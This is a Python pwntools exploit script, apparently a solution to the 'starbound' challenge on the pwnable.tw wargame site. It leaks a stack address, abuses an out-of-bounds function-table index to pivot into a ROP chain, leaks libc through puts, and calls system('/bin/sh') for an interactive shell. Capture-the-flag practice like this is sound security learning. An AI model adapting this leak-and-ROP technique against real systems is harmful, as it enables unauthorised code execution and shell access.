from pwn import *
import sys

target_name = "./starbound"
target = ELF(target_name)

if len(sys.argv) == 1:
	p = process(target_name)
else:
	p = remote("chall.pwnable.tw", 10202)
pause()

ret = 0x8048922
popret = 0x8048939
pop3ret = 0x80491ba
pop2ret = 0x80491bb
pop4ret = 0x80491b9
addesp_12 = 0x8048936
addesp_28 = 0x8048e48
addesp_44 = 0x80496e0
call_base = 0x8058154

addr = (target.got['puts'] - call_base)/4
payload = str(addr)+"\naa" + "b"*52
p.recvuntil("> ")
p.send(payload)
p.recvuntil("b"*52)
stack = u32(p.recv(4)) - (0xffe0f368 - 0xffe0f2b0)	# read() argument address
log.info("stack : {}".format(hex(stack)))

bss = 0x080581A0
addr = (stack + 12 - call_base) / 4
payload = (str(addr)+"\n").ljust(12, "\x00") + p32(addesp_44) + "a"*8
payload += p32(target.plt['puts'])
payload += p32(popret)
payload += p32(target.got['puts'])
payload += p32(target.plt['read'])
payload += p32(pop3ret)
payload += p32(0)
payload += p32(stack+len(payload)+8)
payload += p32(12)

p.recvuntil("> ")
p.send(payload)
puts_addr = u32(p.recv(4))
log.info("puts : 0x%x" % puts_addr)

system = puts_addr - 0x24f00
binsh = system + 0x120a8b

payload = p32(system)
payload += p32(0)
payload += p32(binsh)
p.send(payload)
p.interactive()
